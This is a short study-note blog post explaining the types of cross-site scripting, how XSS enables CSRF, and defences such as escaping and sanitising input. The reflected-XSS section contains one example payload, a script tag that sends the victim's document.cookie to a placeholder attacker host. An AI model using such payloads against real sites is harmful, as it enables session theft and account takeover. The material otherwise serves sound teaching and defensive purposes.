---
title: "XSS"
date: 2020-07-14T15:19:18+10:00

description: "XSS"
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

Client Side Attacks
---

# XSS (Cross Site Scripting)

Injection of malicious client-side code into the user's browser.  
Can lead to cookie/session theft, trolling, CSRF, anything that can be done with Javascript

## Types of XSS

### Reflected XSS

XSS exploit is passed to the victim, who makes a request to the server which reflects that exploit.

1) Victim opens `https://website.com/search?q=<script>window.location="https://attacker/?cookie=" + document.cookie</script>`
2) Server returns the webpage with the script tag in the document
3) Client executes the script tag
4) Pwn'd!

### Stored XSS

XSS exploit is saved in the server (i.e. database); anyone who visits a page which the server displays the exploit is vulnerable

1) Attacker sends payload to server
2) Server stores payload
3) Victim opens a page which contains the payload
4) Pwn'd!

### DOM-Based XSS

XSS exploit is passed to the victim, who makes a request to the server. The response contains more Javascript code which then locally generates and executes the payload.

1) Victim opens malicious link
2) Server returns a webpage with an 'arming' script
3) Client executes the script
4) Script launches the payload
5) Pwn'd!

## Avenues of Attack

* HTTP headers?
* Malformed requests?
* Automated systems (i.e link previews)?

# Cross-Site Request Forgery (CSRF)

Attack where a crafted page (when opened) can send requests (under the victim's name) - as the victim performs the requests.  
With XSS, any possible CSRF protection schemes (i.e. CSRF tokens) could be extracted, and easily inserted into the forged request.

XSS allows CSRF to be performed, because XSS exploits get executed AS THE VICTIM, ON THE SAME SERVER.

Never trust user data! Always validate!  
Never trust other systems! Always validate!  
Validate as many fields as you can!

# Protection

* Validate
  * Whitelist, blacklist
* Sanitise input
  * script, iframe, onload, onerror
* Escape input
  * URL encode, HTML encode
* Use `innerText` or `textContent` instead of `innerHTML`